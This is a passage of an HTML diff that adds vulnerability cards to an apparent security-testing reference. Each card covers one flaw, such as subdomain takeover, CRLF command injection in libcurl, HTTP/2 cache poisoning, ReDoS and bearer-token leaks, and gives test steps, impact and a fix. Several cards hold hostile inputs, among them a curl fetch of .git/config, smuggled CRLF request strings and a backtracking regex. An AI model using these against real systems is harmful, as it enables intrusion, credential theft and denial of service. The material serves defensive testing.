+<p><strong class="section-heading section-impact">Impact:</strong> Unauthorized acquisition of rewards or licenses can lead to financial losses for the sponsor and potentially disrupt the reward program&#x27;s fairness and integrity. It can also lead to misuse of licenses or rewards.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Implement identity verification before issuing a reward, such as validating against a legitimate account level or requiring authentication. Enforce a limit of one redemption per account or unique identifier, and consider adding rate limiting or CAPTCHA to prevent automated abuse.</p>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="API">
+      <button type="button" class="card-toggle">
+        <span class="card-title">
+          <span class="badge badge-inline">API</span>
+          <span class="card-title-text">Unauthorized Label Modification via API</span>
+        </span>
+        <span class="card-meta-mini">
+          <span class="card-date">Added 2026-04-16</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> The API allows users to add labels to issues and pull requests without proper authorization checks. This can be exploited to modify labels on resources that the user shouldn&#x27;t have access to, potentially bypassing intended label-based checks within automated workflows like GitHub Actions. The vulnerability enables unauthorized modification of project metadata.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Authenticate to the API using an account with limited permissions.</li>
+<li>Construct an API request to add a label to an issue or pull request using the API endpoint for adding labels.</li>
+<li>In the request, specify a label name and a color.</li>
+<li>Provide the ID of an issue or pull request that the authenticated user does not have permission to modify. For example, use the ID of a repository that the user is not a collaborator on.</li>
+<li>If the API does not properly validate user authorization, the label will be added successfully.</li>
+<li>Verify that the label has been added to the targeted issue or pull request.</li>
+<li>Observe the effects of label modifications within automated workflows, if applicable (e.g., GitHub Actions).</li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> Unauthorized users can modify labels on issues and pull requests, potentially bypassing intended access controls and disrupting automated workflows that rely on label-based checks. This may lead to project disruption and security breaches.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Implement robust authorization checks on all API endpoints that modify issue or pull request metadata. Ensure that users only have permission to modify labels on resources they have access to. Validate input and implement proper access control mechanisms.</p>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Network">
+      <button type="button" class="card-toggle">
+        <span class="card-title">
+          <span class="badge badge-inline">Network</span>
+          <span class="card-title-text">Exposed .git/config File</span>
+        </span>
+        <span class="card-meta-mini">
+          <span class="card-date">Added 2026-04-16</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> The .git/config file, typically containing repository configuration details, is publicly accessible. This misconfiguration exposes sensitive information about the repository, including internal URLs, developer details, and potentially deployment structure, increasing the risk of source code disclosure and credential leakage.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Send a GET request to &lt;TARGET_URL&gt;/.git/config using a tool like curl.</li>
+<li>Verify the response status code is 200 (OK).</li>
+<li>Examine the content of the response. It should contain the contents of the .git/config file, not a 403 or 404 error.</li>
+<li>Example command: <code>curl &quot;&lt;TARGET<em>URL&gt;/.git/config&quot; -X GET -i -k -H &quot;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,<em>/</em>;q=0.8&quot; -H &quot;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36&quot; -H &quot;Host: &lt;TARGET</em>URL&gt;&quot; -H &quot;Connection: Keep-alive&quot;</code></li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong>  An attacker can retrieve sensitive repository configuration details, potentially leading to the reconstruction of the entire source code repository, exposure of developer credentials, and compromise of the application’s integrity.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Ensure that the .git directory is not publicly accessible by implementing proper server configurations and access controls to prevent direct access to files within the .git directory.  Implement web server directives or configurations to restrict access to hidden files and directories.</p>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Web App">
+      <button type="button" class="card-toggle">
+        <span class="card-title">
+          <span class="badge badge-inline">Web App</span>
+          <span class="card-title-text">Unauthorized Comment Pin/Unpin</span>
+        </span>
+        <span class="card-meta-mini">
+          <span class="card-date">Added 2026-04-16</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> This vulnerability allows users to manipulate the &quot;pinned&quot; status of comments on various resources, bypassing access controls.  An attacker can pin or unpin comments belonging to other users or resources, potentially disrupting workflows or manipulating the appearance of discussions. This occurs due to a lack of proper authorization checks when handling comment pinning/unpinning requests.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Authenticate with a user account on a target platform with comment pinning/unpinning functionality.</li>
+<li>Identify the API endpoint responsible for pinning a comment (e.g., <code>/pin-comment/</code>).</li>
+<li>Obtain a valid CSRF token.</li>
+<li>Obtain a valid session cookie from the authenticated user.</li>
+<li>Discover the comment ID of a target comment that you are not authorized to modify.  This can be achieved by observing network requests or exploring the application&#x27;s interface.</li>
+<li>Construct a POST request to the comment pinning endpoint.  The request body should include the <code>comment_id</code> parameter and the CSRF token.</li>
+<li>Send the constructed POST request with the appropriate headers (Cookie, X-Csrftoken, Content-Type).</li>
+<li>Verify that the comment has been successfully pinned, even though the user should not have permission.  This may involve refreshing the page or re-examining the comment list.</li>
+<li>Repeat steps 6-8, but use the API endpoint responsible for unpinning comments (e.g., <code>/unpin-comment/</code>).</li>
+<li>Attempt to pin/unpin comments belonging to other users or resources beyond your intended scope to confirm the lack of authorization checks.</li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> An attacker can modify comment visibility, disrupt workflows, manipulate discussions, and potentially create a false representation of project status or user agreement.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Implement robust authorization checks on the server-side for any API endpoint that modifies data.  Verify that the user has the necessary permissions to perform the action before executing the request.  Specifically, for comment pinning/unpinning, ensure that the user is the owner of the comment or possesses explicit permission to manage it. Use prepared statements with parameterized queries to avoid SQL injection vulnerabilities.</p>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Network">
+      <button type="button" class="card-toggle">
+        <span class="card-title">
+          <span class="badge badge-inline">Network</span>
+          <span class="card-title-text">Subdomain Takeover</span>
+        </span>
+        <span class="card-meta-mini">
+          <span class="card-date">Added 2026-04-15</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> A subdomain takeover vulnerability occurs when a subdomain is registered but not actively used, allowing an attacker to control it. This can lead to unauthorized access, phishing attacks, or defacement of the compromised subdomain.  The attacker can point the subdomain to their own server, potentially impersonating the legitimate service.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Identify a subdomain of &lt;TARGET_DOMAIN&gt; that is registered but appears inactive. This can be done using subdomain enumeration tools or by reviewing DNS records.</li>
+<li>Attempt to associate the identified subdomain with an external service, such as a third-party hosting provider.  This can be achieved by modifying the DNS records (e.g., CNAME or A record) to point to a server controlled by the tester.</li>
+<li>Verify that the subdomain now resolves to the attacker&#x27;s server by pinging it or attempting to access a webpage hosted on the attacker&#x27;s server.</li>
+<li>Confirm that the attacker can successfully serve content from the compromised subdomain. For example, setting up a simple <code>&lt;html&gt;&lt;body&gt;&lt;h1&gt;Subdomain Takeover&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;</code> page on the attacker’s server and verifying it is served when accessing the subdomain.</li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> An attacker could use the compromised subdomain for phishing campaigns, distributing malware, hosting malicious content, or impersonating the legitimate service, potentially leading to data theft or reputational damage.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Regularly audit and remove or actively utilize all registered subdomains. Implement stricter controls on DNS record management and consider using a service that automatically detects and flags inactive subdomains.</p>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Network">
+      <button type="button" class="card-toggle">
+        <span class="card-title">
+          <span class="badge badge-inline">Network</span>
+          <span class="card-title-text">Out-of-Bounds Read in ASN.1 Parsing</span>
+        </span>
+        <span class="card-meta-mini">
+          <span class="card-date">Added 2026-04-15</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> A vulnerability exists in an ASN.1 parsing routine due to a missing bounds check during the processing of RSA public keys. Specifically, when parsing a key with a zero-length modulus, the parser attempts to dereference a pointer beyond the allocated buffer, potentially leading to a crash or information leakage. This is triggered when using a non-standard TLS backend.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Configure a network application to use a non-OpenSSL TLS backend (e.g., Mbed/GnuTLS).</li>
+<li>Construct a certificate chain containing a crafted RSA public key. The key must have a zero-length modulus represented as a BIT STRING with the content: <code>00 30 02 02 00</code>.</li>
+<li>Initiate a TLS handshake with the target application using the crafted certificate chain.</li>
+<li>Monitor the application for crashes or unexpected behavior.  Observe memory access patterns during the handshake using a memory debugging tool such as AddressSanitizer (ASan).</li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> The vulnerability can lead to a denial-of-service (DoS) condition by crashing the application. In some cases, it might be possible to read potentially sensitive information from memory beyond the allocated buffer.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Implement robust bounds checking before dereferencing pointers in ASN.1 parsing routines. Ensure that loops iterating through ASN.1 elements terminate correctly, considering edge cases like zero-length values. Modify loop conditions to prevent overrunning the buffer, e.g., change <code>for(q = elem.beg; !<em>q &amp;&amp; q &lt; elem.end; q++)</code> to <code>for(q = elem.beg; q &lt; elem.end &amp;&amp; !</em>q; q++)</code>.</p>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Network">
+      <button type="button" class="card-toggle">
+        <span class="card-title">
+          <span class="badge badge-inline">Network</span>
+          <span class="card-title-text">HTTP/1.1 Response Desynchronization due to Conflicting Headers</span>
+        </span>
+        <span class="card-meta-mini">
+          <span class="card-date">Added 2026-04-15</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> This vulnerability arises from a conflict in how a client handles HTTP/1.1 responses containing both <code>Content-Length</code> and <code>Transfer-Encoding: chunked</code> headers.  Incorrect prioritization of these headers leads to a desynchronization of the connection state, potentially allowing smuggled data to be misinterpreted as part of a subsequent response. This can disrupt the expected behavior of network protocols and, in some cases, lead to unintended consequences.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Configure a proxy server that sends HTTP/1.1 responses with both <code>Content-Length</code> and <code>Transfer-Encoding: chunked</code> headers, particularly in scenarios involving authentication challenges (e.g., 407 Proxy Authentication Required).</li>
+<li>Configure a client application (e.g., a <code>curl</code> equivalent) to connect to a target server through the proxy.</li>
+<li>Trigger an authentication request that results in a proxy response containing the conflicting headers.</li>
+<li>Observe if the client prematurely terminates the connection based on the <code>Content-Length</code>, while the <code>Transfer-Encoding: chunked</code> data remains in the connection buffer.</li>
+<li>Initiate a subsequent request through the same connection.</li>
+<li>Verify that the leftover chunked data from the initial response is incorrectly interpreted as part of the new response, leading to errors or unexpected behavior.</li>
+</ol>
+
+<p>Example Payload (Illustrative):</p>
+
+<p>Proxy Response Header (from proxy):</p>
+<pre><code>HTTP/1.1 407 Proxy Authentication Required
+Content-Length: 5
+Transfer-Encoding: chunked</code></pre>
+
+<p><strong class="section-heading section-impact">Impact:</strong>  The vulnerability can cause protocol desynchronization, where the client and server lose track of the expected data stream. This can lead to incorrect processing of subsequent requests, data corruption, or unexpected connection failures. While it may not be a direct attack vector in itself, it highlights a potential flaw in handling network protocols correctly and could be exploited in conjunction with other vulnerabilities.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Clients should strictly adhere to RFC 9112 guidelines when processing HTTP/1.1 responses.  Prioritize <code>Transfer-Encoding: chunked</code> over <code>Content-Length</code> when both are present, and ensure proper handling of chunked data. Implement robust error handling and logging to detect and report protocol desynchronization events. Properly validate header fields to ensure compliance with the protocol specification.</p>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="API">
+      <button type="button" class="card-toggle">
+        <span class="card-title">
+          <span class="badge badge-inline">API</span>
+          <span class="card-title-text">Protocol Command Injection via Programmatic Options</span>
+        </span>
+        <span class="card-meta-mini">
+          <span class="card-date">Added 2026-04-15</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> This vulnerability allows an attacker to inject arbitrary protocol commands into text-based protocols (FTP, SMTP, POP3, IMAP) when options like usernames, passwords, or mail-from addresses are set programmatically within a <code>libcurl</code>-based application. The lack of proper sanitization for these programmatic inputs enables the insertion of CRLF sequences, leading to unintended command execution and potential unauthorized actions.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Create a program or script that utilizes a <code>libcurl</code>-based client library.</li>
+<li>Set a programmatic option (e.g., username, password, or mail-from address) using a string that includes CRLF sequences. For example:</li>
+</ol>
+<pre><code>   curl_easy_setopt(curl, CURLOPT_USERNAME, &quot;user\r\nINJECTED_COMMAND&quot;);</code></pre>
+<ol>
+<li>Connect to a target server using the protocol of interest (e.g., FTP, SMTP, POP3, or IMAP).</li>
+<li>Observe the protocol traffic to confirm that the injected command is being sent to the server. The injected command should be appended to the original command.</li>
+<li>Verify the consequences of executing the injected command (e.g., unauthorized file deletion on an FTP server, sending a spoofed email through an SMTP server).</li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> An attacker can bypass authentication, perform unauthorized actions (such as deleting files or sending spoofed emails), and potentially exfiltrate data by redirecting protocol flows.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Implement centralized sanitization for all programmatic string options used in text-based protocol commands, ensuring they do not contain unsanitized CRLF sequences. Enhance low-level functions responsible for sending protocol commands to detect and reject or safely escape any internal CRLF sequences.  Maintain consistent validation standards for programmatic options and those provided via URLs or other methods.</p>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="API">
+      <button type="button" class="card-toggle">
+        <span class="card-title">
+          <span class="badge badge-inline">API</span>
+          <span class="card-title-text">Bearer Token Leak via Redirects with .netrc Authentication</span>
+        </span>
+        <span class="card-meta-mini">
+          <span class="card-date">Added 2026-04-15</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> This vulnerability involves the leakage of OAuth 2.0 bearer tokens during HTTP redirects when using the <code>.netrc</code> file for authentication. Despite prior mitigation attempts related to CVE-2026-3783, the issue persists, allowing an attacker to intercept sensitive authentication credentials. This can lead to unauthorized access to protected API resources.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Configure a <code>.netrc</code> file containing credentials for a domain controlled by the attacker.</li>
+<li>Execute the following curl command, replacing <code>&lt;SECRET<em>TOKEN&gt;</code> with a valid OAuth 2.0 bearer token and <code>&lt;REDIRECT</em>TO<em>ATTACKER</em>URL&gt;</code> with the URL of the attacker-controlled domain: <code>curl --oauth2-bearer &#x27;&lt;SECRET<em>TOKEN&gt;&#x27; --netrc --location &lt;REDIRECT</em>TO<em>ATTACKER</em>URL&gt;</code></li>
+<li>Observe that the bearer token is transmitted to the redirect target (<code>&lt;REDIRECT<em>TO</em>ATTACKER_URL&gt;</code>).</li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> Unauthorized access to protected APIs and data is possible as the attacker can obtain the victim&#x27;s bearer token and utilize it to impersonate the victim.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Implement robust validation and sanitization of redirect URLs to prevent unintended transmissions of sensitive credentials. Ensure that OAuth 2.0 bearer tokens are not included in redirect requests when using authentication methods like <code>.netrc</code>. Review and strengthen the conditional logic to prevent bypasses of redirect protection mechanisms.</p>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Web App">
+      <button type="button" class="card-toggle">
+        <span class="card-title">
+          <span class="badge badge-inline">Web App</span>
+          <span class="card-title-text">Server-Side ReDoS via User-Controlled Regular Expression</span>
+        </span>
+        <span class="card-meta-mini">
+          <span class="card-date">Added 2026-04-15</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> This vulnerability involves a server-side regular expression denial of service (ReDoS). The issue arises when user-controlled regular expressions are evaluated against input data without proper validation or timeouts, leading to excessive CPU consumption and potential denial of service. Malicious actors can craft regular expressions that trigger exponential backtracking, exhausting server resources.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Send a request to the server, supplying a regular expression in a user-controlled field (e.g., an API key role configuration).</li>
+<li>The regular expression should be designed to cause catastrophic backtracking, such as <code>^(a+)+$</code>.</li>
+<li>Provide an input string to the regular expression that exacerbates the backtracking behavior, for example <code>refs/heads/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!</code>.</li>
+<li>Monitor the server&#x27;s resource usage (CPU, memory, and thread pool activity) while the request is being processed.</li>
+<li>Observe if the server&#x27;s thread pool becomes exhausted or if Puma workers are blocked for an extended period due to the regular expression evaluation.</li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> A single malicious request can exhaust server resources due to catastrophic backtracking, leading to denial of service and disruption of critical services, such as gem publishing operations or CI/CD pipelines.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong></p>
+<ol>
+<li>Implement strict input validation and sanitization for user-supplied regular expressions.</li>
+<li>Enforce time limits (timeouts) on regular expression evaluation to prevent excessive CPU usage.</li>
+<li>Use regular expression complexity analysis tools to identify and mitigate potentially problematic patterns.</li>
+<li>Consider alternative approaches to claim value validation that do not rely on user-supplied regular expressions, such as whitelisting or simpler comparison methods.</li>
+</ol>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Source Code">
+      <button type="button" class="card-toggle">
+        <span class="card-title">
+          <span class="badge badge-inline">Source Code</span>
+          <span class="card-title-text">Node.js Crash via Malformed URL</span>
+        </span>
+        <span class="card-meta-mini">
+          <span class="card-date">Added 2026-04-15</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> A malformed URL format can trigger an assertion error within the Node.js <code>node_url.cc</code> file, leading to a program crash. This vulnerability allows an attacker to cause a denial-of-service by providing a crafted URL that forces the application to crash during URL parsing.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Construct a URL with an invalid or unexpected format that would cause an assertion failure during parsing. This could involve unusual characters or sequences in the URL scheme, hostname, or path.</li>
+<li>Pass the crafted URL to a function that parses the URL, such as <code>url.parse()</code>.</li>
+<li>Observe if the program crashes or exhibits unexpected behavior due to an assertion error. For example: <code>url.parse(&#x27;invalid-url-scheme:///path&#x27;)</code></li>
+<li>The URL should contain characters or sequences known to trigger an assertion failure in the parsing logic.  For instance, a URL with a scheme not handled by the parser, or an extremely long hostname.</li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> An attacker can cause a denial-of-service by sending specially crafted URLs that crash the Node.js application. This could disrupt service availability and potentially impact other users.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Implement robust input validation and error handling when parsing URLs. Thoroughly validate URL components, check for unexpected schemes or characters, and handle parsing errors gracefully without crashing the application. Employ fuzzing and other testing techniques to identify and address potential vulnerabilities in URL parsing logic.</p>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Source Code">
+      <button type="button" class="card-toggle">
+        <span class="card-title">
+          <span class="badge badge-inline">Source Code</span>
+          <span class="card-title-text">Missing Password Policies</span>
+        </span>
+        <span class="card-meta-mini">
+          <span class="card-date">Added 2026-04-15</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> The codebase lacks implementation for essential password policies, such as password history and strong password requirements. This can expose the system to vulnerabilities like brute-force attacks and credential compromise due to easily guessable or weak passwords.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Analyze the source code, specifically the <code>password_policies.go</code> file, to verify the absence of password history enforcement mechanisms.</li>
+<li>Review the password validation logic to confirm the absence of checks for strong password complexity (e.g., uppercase letters, lowercase letters, digits, special characters).</li>
+<li>Attempt to reuse previously used passwords to verify the lack of password history enforcement.</li>
+<li>Attempt to set passwords that do not meet complexity requirements (e.g., all lowercase, short length) to observe the acceptance of weak credentials.</li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong>  A lack of proper password policies increases the risk of unauthorized account access through brute-force attacks, credential stuffing, and the compromise of sensitive data.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Implement password history policies to prevent password reuse. Enforce strong password complexity requirements, including uppercase letters, lowercase letters, digits, and special characters, ensuring robust password security.</p>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="API">
+      <button type="button" class="card-toggle">
+        <span class="card-title">
+          <span class="badge badge-inline">API</span>
+          <span class="card-title-text">Potential Denial of Service (DoS) via Unbounded Error Collection</span>
+        </span>
+        <span class="card-meta-mini">
+          <span class="card-date">Added 2026-04-15</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> A vulnerability exists where an application accumulates a large number of error instances without any limits, potentially leading to resource exhaustion or denial of service. This occurs when numerous errors are triggered concurrently, overwhelming the application&#x27;s ability to handle them efficiently.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Trigger multiple password policy violations within a short time frame.  This could be achieved by sending numerous requests attempting to set a password that fails against several defined policies.</li>
+<li>Observe the application&#x27;s resource consumption (memory usage, CPU utilization).</li>
+<li>Attempt to perform other operations on the application to see if its performance is degraded or if it becomes unresponsive.</li>
+<li>Monitor the system for signs of instability or crashes.</li>
+<li>Simulate a burst of policy failures using automated scripts or tools to quickly generate a significant number of <code>PasswordPolicyError</code> instances.</li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> The uncontrolled accumulation of error instances can lead to excessive memory consumption, CPU utilization, and ultimately, a denial of service, preventing legitimate users from accessing the application&#x27;s functionality.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Implement a mechanism to limit the number of errors collected and processed. This could involve setting a maximum size for the error collection container, implementing a batch processing approach, or employing other strategies to prevent unbounded error accumulation.  Consider implementing rate limiting or other safeguards to prevent excessive error triggering.</p>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Web App">
+      <button type="button" class="card-toggle">
+        <span class="card-title">
+          <span class="badge badge-inline">Web App</span>
+          <span class="card-title-text">Password Strength Policy Bypass via Server-Side Validation Flaw</span>
+        </span>
+        <span class="card-meta-mini">
+          <span class="card-date">Added 2026-04-15</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> This vulnerability allows attackers to bypass password strength policies on a web application. The server-side validation logic for password complexity requirements is flawed, allowing users to set weak passwords that do not meet the stated policy, potentially compromising account security.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Navigate to the user registration or password change page on the target application.</li>
+<li>Attempt to set a password that does not meet the application&#x27;s stated password complexity policy (e.g., minimum length, required character types). A password like &quot;password123&quot; or &quot;12345678&quot; could be used.</li>
+<li>Observe whether the application&#x27;s server-side validation allows the weak password to be set successfully.</li>
+<li>Verify that the newly set password can be used to authenticate against the application, confirming the bypass.</li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> An attacker can create accounts with weak, easily guessable passwords, potentially leading to account compromise, unauthorized access to sensitive data, or further exploitation of the system.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Implement robust server-side validation for password complexity requirements. Ensure that password strength policies are enforced consistently and accurately on the server-side, rather than relying solely on client-side validation. Employ strong hashing algorithms for storing passwords securely.</p>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Network">
+      <button type="button" class="card-toggle">
+        <span class="card-title">
+          <span class="badge badge-inline">Network</span>
+          <span class="card-title-text">HTTP/2 Cache Poisoning via Non-Authoritative Push</span>
+        </span>
+        <span class="card-meta-mini">
+          <span class="card-date">Added 2026-04-15</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> This vulnerability allows an attacker to manipulate HTTP/2 server push to create a misleading HTTPS URL. A server can push content over a cleartext HTTP/2 connection with a <code>PUSH_PROMISE</code> header that specifies an HTTPS origin.  If the client library doesn&#x27;t properly validate this origin, it may treat the pushed content as if it came from a trusted HTTPS source, leading to potential cache poisoning or misinterpretation of the resource&#x27;s origin.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Configure a server to issue HTTP/2 push requests over a cleartext HTTP/2 connection (h2c).</li>
+<li>The server should include a <code>PUSH<em>PROMISE</code> header with the <code>scheme</code> attribute set to <code>https</code> and an attacker-controlled authority. For example: <code>PUSH</em>PROMISE: scheme=https, authority=&lt;ATTACKER_AUTHORITY&gt;</code>.</li>
+<li>The client connects to the server using HTTP/2 cleartext.</li>
+<li>Observe that the client library accepts the pushed content and reports an effective URL that includes the attacker-controlled scheme and authority (e.g., <code>https://&lt;ATTACKER<em>AUTHORITY&gt;/&lt;PUSHED</em>PATH&gt;</code>).</li>
+<li>Verify that this misleading URL is used for caching or other security-sensitive operations, potentially leading to the compromise of data or functionality.</li>
+<li>Run the client and server as demonstrated in the original report’s PoC, noting that the client receives cleartext data but reports an HTTPS URL: <code>effective_url=https://trusted.example:18080/pushed</code>.</li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> An attacker can potentially poison caches by causing the server to push attacker-controlled cleartext content to the client under a trusted HTTPS URL. This can lead to the retrieval and execution of malicious content by users, or other security breaches.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Client libraries implementing HTTP/2 push must rigorously validate the <code>PUSH_PROMISE</code> header, ensuring that the scheme and authority are consistent with the connection’s origin. The server should only be allowed to push resources with a scheme that matches the underlying transport (either HTTP or HTTPS). This prevents attackers from exploiting vulnerabilities in the client&#x27;s trust model.</p>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Web App">
+      <button type="button" class="card-toggle">
+        <span class="card-title">
+          <span class="badge badge-inline">Web App</span>
+          <span class="card-title-text">CRLF Injection via PROXY Protocol Client IP</span>
+        </span>
+        <span class="card-meta-mini">
+          <span class="card-date">Added 2026-04-15</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> This vulnerability arises when an application utilizing libcurl passes attacker-controlled data to the <code>CURLOPT<em>HAPROXY</em>CLIENT_IP</code> option without proper validation. The data is then directly incorporated into the HAProxy PROXY protocol header, allowing an attacker to inject CRLF sequences. This results in the premature termination of the PROXY header, facilitating IP address spoofing and potential HTTP request smuggling, compromising the trust boundary between the proxy and backend servers.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Configure a target application that uses libcurl and allows external control of the <code>CURLOPT<em>HAPROXY</em>CLIENT_IP</code> option.</li>
+<li>Craft a malicious <code>client<em>ip</code> string containing CRLF sequences and arbitrary HTTP requests.  For example: <code>127.0.0.1\r\nGET /admin HTTP/1.1\r\nHost: &lt;TARGET</em>HOST&gt;\r\n\r\n</code></li>
+<li>Pass the malicious <code>client<em>ip</code> string to the <code>CURLOPT</em>HAPROXY<em>CLIENT</em>IP</code> option in libcurl.</li>
+<li>Observe the resulting HAProxy PROXY protocol header sent to the backend server. It should contain the injected HTTP request following the spoofed IP address.</li>
+<li>Verify that the backend server processes the injected HTTP request as a legitimate request from the spoofed IP address.</li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> Exploitation of this vulnerability allows for IP address spoofing, potentially bypassing access controls based on source IP addresses. It can also enable HTTP request smuggling, allowing an attacker to inject arbitrary requests into the backend server, leading to unauthorized access, data theft, or denial of service.  Audit logs can be manipulated to obscure malicious activity.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Implement strict input validation for the <code>CURLOPT<em>HAPROXY</em>CLIENT_IP</code> option, ensuring that the provided value is a valid IPv4 or IPv6 address and does not contain any CRLF sequences. Always treat data received from external sources, including user inputs and headers, with extreme caution and sanitize or validate it before using it in any protocol headers or requests.</p>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Network">
+      <button type="button" class="card-toggle">
+        <span class="card-title">
+          <span class="badge badge-inline">Network</span>
+          <span class="card-title-text">Memory Leak in HTTP/2 Server via WINDOW_UPDATE</span>
+        </span>
+        <span class="card-meta-mini">
+          <span class="card-date">Added 2026-04-15</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> This vulnerability describes a memory leak within an HTTP/2 server implementation. Repeatedly sending WINDOW_UPDATE frames on stream 0 can exhaust available memory resources, potentially leading to denial-of-service conditions and instability. The server fails to properly track and release memory associated with these frames, resulting in a gradual accumulation of memory usage.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
